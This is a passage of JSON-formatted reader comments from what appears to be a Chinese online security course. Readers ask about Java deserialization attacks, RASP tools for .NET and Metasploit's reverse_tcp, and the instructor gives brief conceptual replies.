BF4548B502CB","user_header":"https://static001.geekbang.org/account/avatar/00/18/41/59/78042964.jpg","comment_is_top":false,"comment_ctime":1579305602,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1579305602","product_id":100041701,"comment_content":"嵌套100层HashSet的反序列化攻击的例子——对CPU的消耗可能与哈希碰撞后退化为链表，进而加大遍历的复杂度有关。不知道Java新版本是否会有相应的基础性对策……","like_count":0},{"had_liked":false,"id":167082,"user_name":"leslie","can_delete":false,"product_type":"c1","uid":1324255,"ip_address":"","ucode":"798E7C1CC98CC2","user_header":"https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg","comment_is_top":false,"comment_ctime":1577687887,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1577687887","product_id":100041701,"comment_content":"RASP方式听说过不少，只知道要去用，不知道为何，毕竟主业是运维不是网络相关的；学习中不断补充强化自己。谢谢老师的分享。","like_count":0},{"had_liked":false,"id":166784,"user_name":"有学识的兔子","can_delete":false,"product_type":"c1","uid":1628867,"ip_address":"","ucode":"D1D654B1562FC9","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIicr82CnrdEjibibAvyeKRQHszSzIAqoCWxN0kqC442XcjEae6S9j6NDtKLpg4Da4CUQQeUFUicWqiaDw/132","comment_is_top":false,"comment_ctime":1577594519,"is_pvip":false,"replies":[{"id":"64957","content":"我理解的reverse_tcp应该是用来建立一个反弹shell的工具，跟具体的漏洞无关。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1577761298,"ip_address":"","comment_id":166784,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1577594519","product_id":100041701,"comment_content":"老师您好。像常用的渗透工具 metaexploit 里面提供的meterpreter&#47;reverse_tcp是不是也是利用系统的反序列化的工作流程，执行一段黑客插入的恶意指令程序.","like_count":0,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":479622,"discussion_content":"我理解的reverse_tcp应该是用来建立一个反弹shell的工具，跟具体的漏洞无关。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577761298,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":166607,"user_name":"geek.flare","can_delete":false,"product_type":"c1","uid":1103862,"ip_address":"","ucode":"91FCCD31199BCF","user_header":"https://static001.geekbang.org/account/avatar/00/10/d7/f6/e2e9f8cd.jpg","comment_is_top":false,"comment_ctime":1577518095,"is_pvip":false,"replies":[{"id":"64956","content":"目前开源的RASP，我知道的只有百度的OpenRASP，不过似乎并没有支持.net。商业版本倒是会有宣称能够实现的。从原理上说，和Java的实现机制应该比较类似。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1577761178,"ip_address":"","comment_id":166607,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1577518095","product_id":100041701,"comment_content":"我是做.net 开发，在编写服务之间的通讯时经常会用到序列化和反序列化，以前真没想到会有这种漏洞。请问.net有类似的RASP工具吗?","like_count":0,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":479555,"discussion_content":"目前开源的RASP，我知道的只有百度的OpenRASP，不过似乎并没有支持.net。商业版本倒是会有宣称能够实现的。从原理上说，和Java的实现机制应该比较类似。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577761178,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":166191,"user_name":"柒月","can_delete":false,"product_type":"c1","uid":1371240,"ip_address":"","ucode":"839A8F88C376A3","user_header":"https://static001.geekbang.org/account/avatar/00/14/ec/68/06d59613.jpg","comment_is_top":false,"comment_ctime":1577413949,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1577413949","product_id":100041701,"comment_content":"没后台经验  前几节web的受益良多 这里就只能大概了解下概念了 ","like_count":0}]}